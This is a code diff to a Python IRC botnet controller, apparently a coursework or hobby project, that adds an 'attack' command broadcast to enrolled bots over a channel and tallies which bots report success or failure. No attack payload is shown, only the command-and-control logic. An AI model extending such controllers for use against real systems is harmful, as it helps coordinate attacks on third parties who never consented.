@@ -10,6 +10,28 @@ PORT = 0000
 CHAN = ''
 PASS = ''
 BOTS = []
+ATTACK_COUNTER = 0
+
+# same as other methods =3=
+def attack(sender, overflow):
+    if sender in BOTS:
+        global ATTACK_COUNTER
+
+        if('success' in overflow):
+            print(sender + " attacked")
+            ATTACK_COUNTER = ATTACK_COUNTER + 1
+        elif('failed' in overflow):
+            print(sender + " failed")
+
+    if "PRIVMSG" in overflow:
+        (prefix, command, args) = parsemsg(':'+overflow.split(':',1)[1])
+
+        sender = prefix.split("!")[0]
+        if(len(args) == 1):
+            attack(sender, args[0])
+        else:
+            attack(sender, args[1])
+    return
 
 '''
     shutdown(sender, overflow)
@@ -27,7 +49,9 @@ def shutdown(sender, overflow):
             shutdown(sender, args[0])
         else:
             shutdown(sender, args[1])
+
     return
+  
 '''
     checks for bot status every 5s
 '''
@@ -47,6 +71,10 @@ def status_check():
 def handle_bot_status(sender, overflow):
     #print("sender in handle_bot_stat: "+sender)
     #print("Bot detected!")
+
+    if sender == '':
+        return
+
     if sender not in BOTS:
         BOTS.append(sender)
     # handle overflow of msg from other bots
@@ -124,6 +152,12 @@ def recv():
                         handle_bot_status(sender, args[1])
                 if "shutting down" in args[1]:
                     shutdown(sender, args[1])
+
+                if "attack" in args[1]:
+                    attack(sender, args[1])
+                    
+
+                
     return
 
 def send():
@@ -133,6 +167,7 @@ def send():
     
     while not QUIT:
         msg = input("Command > ")
+        print("")
         if msg == "quit":
             print("Sending "+(msg+"\r"))
             s.send((msg+"\r\n").encode('utf-8'))
@@ -140,6 +175,7 @@ def send():
             QUIT = True
         elif msg == "status":
             print("Found %d bots:"%len(BOTS))
+            print(BOTS)
             for b in BOTS:
                 print(b)
         elif msg == "shutdown":
@@ -149,9 +185,15 @@ def send():
             time.sleep(5)
             bots_after = bots_before - len(BOTS)
             print("Total: %d bots shut down"%bots_after)
-        else:
-            print("Sending "+privmsg(CHAN, msg))
+        elif "attack" in msg:
             s.send(privmsg(CHAN, msg).encode('utf-8'))
+            time.sleep(5)
+            global ATTACK_COUNTER
+            print("Total: %d successful, %d unsuccessful"%(ATTACK_COUNTER, (len(BOTS)-ATTACK_COUNTER)))
+            ATTACK_COUNTER = 0
+        else:
+            s.send(privmsg(CHAN, msg).encode('utf-8'))
+
     return
 
 if __name__ == "__main__":
